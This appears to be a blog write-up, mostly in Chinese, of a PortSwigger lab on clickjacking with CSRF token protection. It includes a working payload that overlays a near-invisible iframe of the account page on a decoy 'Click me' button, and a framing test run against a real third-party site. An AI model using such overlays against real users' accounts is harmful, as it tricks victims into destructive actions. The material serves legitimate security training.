---
layout: post
title: "Basic clickjacking with CSRF token protection"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Clickjacking
author: ""
tags: ['PortSwigger_Lab', 'Clickjacking']
---



# Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a [CSRF token](https://portswigger.net/web-security/csrf/tokens). A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: `wiener:peter`

#### Note

The victim will be using Chrome so test your exploit on that browser.




此實驗室包含登錄功能和受 [CSRF 令牌] (https://portswigger.net/web-security/csrf/tokens) 保護的刪除帳戶按鈕。 用戶將點擊誘餌網站上顯示“點擊”一詞的元素。

為了解決這個問題，請製作一些 HTML 來框住帳戶頁面並欺騙用戶刪除他們的帳戶。 刪除帳戶後，實驗室解決。

您可以使用以下憑據登錄到您自己的帳戶：`wiener:peter`

筆記

受害者將使用 Chrome，因此請在該瀏覽器上測試您的漏洞利用。


參考文章:
https://www.freebuf.com/articles/web/290140.html





為了更好的了解，你可以先登入一個需要會員的網站。

我這邊是用 eyny 這個網站

```
http://www10.eyny.com/
```


登入自己的會員後，可以開始觀看影片。
右上角顯示自己的帳號名
不登入是無法的。

寫一個test_iframe.html
```html
<style>
    iframe {
        position:relative;
        width: 200Vh;
        height: 100vh;
        opacity: 1;
        z-index: 2;
    }
 
</style>


<iframe src="http://www10.eyny.com/"></iframe>

```


然後用同樣browser 開 test_iframe.html

你會看到插入了 http://www10.eyny.com/ 這個網頁。但是右上角顯示需要登入。

別怕這可能只是 iframe 向server 抓取的網頁，而不是抓我們browser 的內容。

隨便點擊一個影片，它還是可以觀看。

這也就說明了，由於是同一個browser 發出來的請求，自然會帶上session。




進入 exploit server 
慢慢調整 Test me 到 Delete account 按鈕 上面
```

<style>  
iframe {  
	position:relative;  
	width:500px;  
	height: 700px;  
	opacity: 0.0001;  
	z-index: 2;  
}  
div {  
	position:absolute;  
	top:500px;  
	left:60px;  
	z-index: 1;  
}  
</style>

<div>Click me</div>  
<iframe src="https://0a5800150456ed9bc0916157007e0027.web-security-academy.net/my-account"></iframe>

```


這邊 opacity 官方說要0.0001 調整透明度

我不小心刪了 點擊了刪除 要等20分鐘。

最後送給 Deliver exploit to victim

由於 iframe 的強大連csrf token 都可以輕鬆繞過。



這裡說說這題在實際情況中，其實是只有一點點用處的。


首先如果它有設置一些安全選項你是無法 iframe 其它目錄的。

說明:
```
https://blog.huli.tw/2022/04/07/iframe-and-window-open/

```


也就是說，eyny 的官網可以被iframe 

如果使用者登入後，進入了 /account_setting 這個頁面 你是無法 iframe 的，也就無法操作  /account_setting 底下的任何點擊劫持。

除非有其它繞過的方法


但是還是能夠做一些些事的，也就是官網上能 iframe 的內容都可以點擊劫持，同樣也是可以繞過 csrf 的 token。








